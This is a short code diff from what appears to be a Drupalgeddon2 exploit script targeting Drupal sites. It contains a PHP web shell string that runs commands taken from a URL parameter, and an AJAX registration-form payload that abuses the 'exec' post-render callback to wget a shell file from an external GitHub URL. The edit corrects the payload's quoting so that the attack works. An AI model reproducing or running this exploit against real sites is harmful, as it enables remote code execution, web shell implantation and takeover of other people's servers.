@@ -10,7 +10,7 @@ url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1
 
 shell = "<?php system($_GET['cmd']); ?>"
 
-payload = "{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/sh.php}"
+payload = "{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/sh.php'}"
 
 uri = URI(url)
 
